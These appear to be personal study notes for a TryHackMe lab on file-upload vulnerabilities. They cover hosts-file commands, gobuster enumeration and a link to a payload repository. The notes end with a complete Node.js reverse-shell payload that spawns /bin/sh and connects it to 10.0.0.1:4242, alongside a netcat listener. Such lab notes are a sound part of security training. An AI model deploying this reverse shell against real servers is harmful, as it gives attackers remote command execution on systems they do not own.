---
Tags: 
date: 06-14-2022
---

[TryHackMe Rooms](./TryHackMeRooms)

---



These are my notes for the Upload Vulnerabilities room

[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

hosts for Linux

```python
echo "MACHINE_IP overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm" | sudo tee -a /etc/hosts

sudo sed -i '$d' /etc/hosts
```

hosts for power shell and windows

```python
AC C:\\Windows\\System32\\drivers\\etc\\hosts "MACHINE_IP   overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm"

(GC C:\\Windows\\System32\\drivers\\etc\\hosts | select -Skiplast 1) | SC C:\\Windows\\System32\\drivers\\etc\\hosts
```

```python
gobuster dir -u <http://jewel.uploadvulns.thm/content> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -u <http://jewel.uploadvulns.thm/content> -w ~/thmuploadvulns/UploadVulnsWordlist.txt -t 300 -x jpg | tee ~/thmuploadvulns/gobuster-content-default

tee formats the data?
```

[GoBuster CheatSheet](https://www.notion.so/GoBuster-CheatSheet-f2ce00609dc04ee089ab1370386ffb69)

```python
NODEJS reverse shell nc -lvnp 4242

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

TMUX—— CTRL+SHIFT+R